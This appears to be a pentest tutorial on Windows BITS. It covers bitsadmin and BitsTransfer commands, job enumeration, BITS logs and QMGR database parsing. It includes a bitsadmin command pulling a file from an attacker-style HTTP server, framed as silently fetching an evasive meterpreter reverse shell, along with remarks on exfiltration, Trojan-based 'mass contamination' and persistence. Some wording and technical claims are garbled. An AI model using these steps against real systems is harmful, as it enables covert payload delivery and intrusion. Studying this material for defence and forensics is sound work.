### Introduction to BITS: 

BITS stands for Background Intelligent Transfer Service and is a widely used service for downloading files from or to HTTP web servers and SMB file sharing. BITS is sufficiently autonomous to reduce the costs as much as possible to be as optimized as possible for the user or the programmer because yes BITS can also be useful in programming, BITS is programmable in C/C++ and can be called in .NET all that thanks to COM.
BITS has a CLI version called BitsAdmin and commands included in the powershell. BITS can be used for administration with logging systems from actions like /transfer or SANP protocols (notification protocols) for example: `SetNotifyFlag`. In pentest, BITS is very used for EOAP (Exfiltration over Alternative Protocol).
Use of bitsadmin and analysis of traffics:

```powershell
bitsadmin /transfer howtohack http://192.168.1.45:8000/ak.txt "C:\Users\hth\Documents\ak.txt"
```

- DISPLAY**: job name
- FILE**: number of files
- BYTES**: size of the "c hack" file
- PRIORITY**: corresponds to the order of download
- STATE**: Transferred, state of the job.

you can also use it with the PowerShell modules: `BitsTransfer`
```powershell
Import-Module BitsTransfer
```

BITS supports asynchronous transfer by default but you can specify via the `-Asychronous` argument, for the file validation you have to use `Complete-BitsTransfer`.
Downloading a meterpreter reverse shell silently: 

![image](https://user-images.githubusercontent.com/75935486/152225631-6de1bd82-5dc8-4ac3-b861-a73634d4fe45.png)

start the HTTP server and download the evasive payload via BITS asynchronously. In the context of mass contamination, we can make the download automatic in C or C++ in a third party Trojan, but in the educational context we stay in simple things.


#### BITSAdmin enumeration: 

```powershell
# listed jobs
bitsadmin /list
# get more info on a job
bitsadmin /info 482FCAF0-74BF-469B-8929-5CCD028C9499 /verbose
# manage the current jobs
bitsadmin /monitor
# only one job to manage
bitsadmin /monitor 482FCAF0-74BF-469B-8929-5CCD028C9499
# complete info (Notify, Proxy, GUID...) on all active jobs:
bitsadmin /info
```

BITS logs : `C:\Windows\System32\winevt\Logs\Microsoft-Windows-Bits-Client%4Operational`

![image](https://user-images.githubusercontent.com/75935486/152225800-497abaf1-1545-48b0-903e-9d87c51242f6.png)


#### BITS Enumeration from SC queries and from the QMGR & ESE db: 

QMGR stands for Querie Manager, it records every activity of every BITS Job in a database but it's encrypted, you have to use hex editor or other database editor16 to hope to dump something.
here what we are interested in is QMGR.db because it's where the BITS Job info is logged

![image](https://user-images.githubusercontent.com/75935486/152225890-df0b4a93-7476-4513-bd75-b470dc0752a3.png)

```json
> python BitsParser.py -i qmgr.db
Processing file qmgr.db
{
    "JobType": "download",
    "JobPriority": "normal",
    "JobState": "suspended",
    "JobId": "b733e5e1-12ad-463e-a125-ade26cc1fab6",
    "JobName": "SpeechModelDownloadJob",
    "OwnerSID": "S-1-5-20",
    "Owner": "NT AUTHORITY\NETWORK SERVICE",
    "CreationTime": "2021-01-25T11:52:05Z",
    "ModifiedTime": "2021-01-25T12:45:21Z"
}
```

#### Pesistence with BITS : 

Raising the download priority. `/priority high`

Windows BITS compromises:
- https://www.secureworks.com/blog/malware-lingers-with-bits

C++/C/.NET development with BITS integration: 
- https://docs.microsoft.com/en-us/windows/win32/bits/using-bits
